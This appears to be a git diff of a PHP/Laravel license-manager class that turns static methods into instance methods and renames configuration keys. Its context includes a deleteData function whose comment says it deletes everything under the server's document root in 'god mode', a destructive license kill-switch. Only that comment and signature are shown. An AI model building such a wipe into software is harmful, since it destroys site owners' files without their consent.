@@ -8,6 +8,8 @@ use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\File;
 use Carbon\Carbon;
+
+
 class LicMan
 {
     /**
@@ -18,15 +20,15 @@ class LicMan
     
     
      //check Auto PHP Licenser core configuration and return an array with error messages if something wrong
-    public static function checkSettings(){
+    public function checkSettings(){
         $notifications_array=array();
 
-            if (empty(config('lmconfig.PRODUCT_KEY'))) //invalid encryption salt
+            if (empty(config('installer.PRODUCT_KEY'))) //invalid encryption salt
             {
                 $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_PRODUCT_KEY');
             }
 
-            if (empty(config('installer.apiKey'))) //invalid License Manager Installer API Key
+            if (empty(config('installer.API_KEY'))) //invalid License Manager Installer API Key
             {
                 $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_MISSING_INSTALL_API_KEY');
             }
@@ -55,7 +57,7 @@ class LicMan
 
 
     //generate signature to be submitted to Auto PHP Licenser server
-    public static function generateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
+    public function generateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
     {
     $script_signature=null;
     $root_ips_array=gethostbynamel($this->getRawDomain(config('lmconfig.LM_ROOT_URL')));
@@ -71,7 +73,7 @@ class LicMan
 
 
     //install license
-    public static function installLicense($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
+    public function installLicense($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
         $notifications_array= array();
         $apl_core_notifications= $this->checkSettings(); //check core settings
         if (empty($apl_core_notifications)) { //only continue if script is properly configured
@@ -133,12 +135,12 @@ class LicMan
     }
 
 
-    public static function getMyKey($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
+    public function getMyKey($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
         $userAgent="License Manager cURL"; 
         $connect_timeout=20;
         $server_response_array=array();
         $formatted_headers_array=array();
-        $personalToken = config('installer.apiKey');
+        $personalToken = config('installer.API_KEY');
 
         $ch=curl_init();
             curl_setopt($ch, CURLOPT_URL, $url);
@@ -170,7 +172,7 @@ class LicMan
     }
 
     //encrypt text with custom key
-    public static function customEncrypt($string, $key) {
+    public function customEncrypt($string, $key) {
         $encrypted_string=null;
 
         if (!empty($string) && !empty($key)) {
@@ -186,7 +188,7 @@ class LicMan
 
 
     //process response from Auto PHP Licenser server. if response received, validate it and parse notifications and data (if any). if response not received or is invalid, return a corresponding notification
-    public static function parseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
+    public function parseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
         $notifications_array=array();
 
         if (!empty($content_array)) { //response received, validate it
@@ -212,7 +214,7 @@ class LicMan
 
 
     //get raw domain (returns (sub.)domain.com from url like http://www.(sub.)domain.com/something.php?xx=yy)
-    public static function getRawDomain($url) {
+    public function getRawDomain($url) {
         $raw_domain=null;
 
         if (!empty($url)) {
@@ -235,7 +237,7 @@ class LicMan
 
 
     //verify signature received from Auto PHP Licenser server
-    public static function verifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
+    public function verifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
         $result=false;
         $root_ips_array=gethostbynamel($this->getRawDomain(config('lmconfig.LM_ROOT_URL')));
 
@@ -253,12 +255,12 @@ class LicMan
 
 
     //make post requests with cookies and referrers, return array with server headers, errors, and body content
-    public static function customPost($url, $post_info=null, $refer=null) {
+    public function customPost($url, $post_info=null, $refer=null) {
         $userAgent="License Manager cURL"; 
         $connect_timeout=20;
         $server_response_array=array();
         $formatted_headers_array=array();
-        $personalToken = config('installer.apiKey');
+        $personalToken = config('installer.API_KEY');
 
         if (filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info)) {
             if (empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL)) { //use original URL as refer when no valid refer URL provided 
@@ -301,7 +303,7 @@ class LicMan
 
 
     //return an array with license data,no matter where license is stored
-    public static function getLicenseData() {
+    public function getLicenseData() {
         $isInstalled = 0;
 
                 $licRecDB = DB::table('lmconfig')->first();
@@ -318,7 +320,7 @@ class LicMan
 
 
     //parse license file and make an array with license data
-    public static function parseLicenseFile() {
+    public function parseLicenseFile() {
         $licRecStorage = 0;
         $licFile  = File::get(Storage::disk('local')->get('license.lic'));
         //$pubKey = File::get(Storage::disk('local')->get('public.txt'));
@@ -371,7 +373,7 @@ class LicMan
 
 
     //calculate number of days between dates
-    public static function getDaysBetweenDates($date_from, $date_to)
+    public function getDaysBetweenDates($date_from, $date_to)
     {
     $number_of_days=0;
 
@@ -387,7 +389,7 @@ class LicMan
 
 
 
-    public static function verifyLicense($MYSQLI_LINK=null, $FORCE_VERIFICATION=0)
+    public function verifyLicense($MYSQLI_LINK=null, $FORCE_VERIFICATION=0)
     {
     $notifications_array=array();
     $update_lrd_value=0;
@@ -423,7 +425,7 @@ class LicMan
                     }
                 }
 
-            if ($this->customDecrypt($LRD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY)<date("Y-m-d")) //used to make sure database gets updated only once a day, not every time script is executed. do it BEFORE new $INSTALLATION_KEY is generated
+            if ($this->customDecrypt($LRD, config('installer.PRODUCT_KEY').$INSTALLATION_KEY)<date("Y-m-d")) //used to make sure database gets updated only once a day, not every time script is executed. do it BEFORE new $INSTALLATION_KEY is generated
                 {
                 $update_lrd_value=1;
                 }
@@ -471,7 +473,7 @@ class LicMan
 
 
     //check license data and return false if something wrong
-    public static function checkData($MYSQLI_LINK=null)
+    public function checkData($MYSQLI_LINK=null)
     {
     $error_detected=0;
     $cracking_detected=0;
@@ -481,8 +483,8 @@ class LicMan
 
     if (!empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD)) //do further check only if essential variables are valid
         {
-        $LCD=$this->customDecrypt($LCD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY); //decrypt $LCD value for easier data check
-        $LRD=$this->customDecrypt($LRD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY); //decrypt $LRD value for easier data check
+        $LCD=$this->customDecrypt($LCD, config('installer.PRODUCT_KEY').$INSTALLATION_KEY); //decrypt $LCD value for easier data check
+        $LRD=$this->customDecrypt($LRD, config('installer.PRODUCT_KEY').$INSTALLATION_KEY); //decrypt $LRD value for easier data check
 
         if (!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1))) //invalid script url
             {
@@ -499,7 +501,7 @@ class LicMan
             $error_detected=1;
             }
 
-        if (empty($INSTALLATION_KEY) || !password_verify($LRD, $this->customDecrypt($INSTALLATION_KEY, config('lmconfig.PRODUCT_KEY').$ROOT_URL))) //invalid installation key (value - current date ("Y-m-d") encrypted with password_hash and then encrypted with custom function (salt - $ROOT_URL). Put simply, it's LRD value, only encrypted different way)
+        if (empty($INSTALLATION_KEY) || !password_verify($LRD, $this->customDecrypt($INSTALLATION_KEY, config('installer.PRODUCT_KEY').$ROOT_URL))) //invalid installation key (value - current date ("Y-m-d") encrypted with password_hash and then encrypted with custom function (salt - $ROOT_URL). Put simply, it's LRD value, only encrypted different way)
             {
             $error_detected=1;
             }
@@ -552,7 +554,7 @@ class LicMan
 
 
     //return root url from long url (http://www.domain.com/path/file.php?aa=xx becomes http://www.domain.com/path/), remove scheme, www. and last slash if needed
-    public static function getRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash)
+    public function getRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash)
     {
     if (filter_var($url, FILTER_VALIDATE_URL))
         {
@@ -606,7 +608,7 @@ class LicMan
 
 
     //delete user data
-    public static function deleteData($MYSQLI_LINK=null)
+    public function deleteData($MYSQLI_LINK=null)
     {
     if (isset($_SERVER['DOCUMENT_ROOT'])) //god mode enabled, delete everything from document root directory (usually httpdocs or public_html). god mode might not be available for IIS servers that don't always set $_SERVER['DOCUMENT_ROOT']
         {
@@ -635,7 +637,7 @@ class LicMan
 
 
     //get current page url and remove last slash if needed
-    public static function getCurrentUrl($remove_last_slash=null)
+    public function getCurrentUrl($remove_last_slash=null)
     {
     $current_url=null;
 
@@ -669,7 +671,7 @@ class LicMan
 
 
     //verify date and/or time according to provided format (such as Y-m-d, Y-m-d H:i, H:i, and so on)
-    public static function verifyDateTime($datetime, $format)
+    public function verifyDateTime($datetime, $format)
     {
     $result=false;
 
@@ -688,7 +690,7 @@ class LicMan
     }
 
     //decrypt text with custom key
-    public static function customDecrypt($string, $key)
+    public function customDecrypt($string, $key)
     {
     $decrypted_string=null;
 
